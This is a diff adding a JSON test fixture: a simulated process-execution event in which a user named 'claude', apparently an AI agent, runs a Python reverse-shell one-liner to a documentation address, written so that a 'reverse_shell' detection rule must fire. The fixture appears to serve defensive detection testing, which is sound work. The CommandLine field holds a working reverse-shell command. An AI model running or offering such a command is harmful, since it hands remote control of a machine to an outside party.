@@ -1,0 +1,10 @@
+{
+  "_comment": "The classic Python reverse-shell one-liner (to a documentation address; the egress wall drops it anyway). MUST fire reverse_shell.",
+  "EventID": "1",
+  "Image": "/run/current-system/sw/bin/python3",
+  "CommandLine": "python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.0.2.1\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])",
+  "User": "claude",
+  "CurrentDirectory": "/home/claude",
+  "ParentImage": "/run/current-system/sw/bin/bash",
+  "key": "agent-claude-exec"
+}
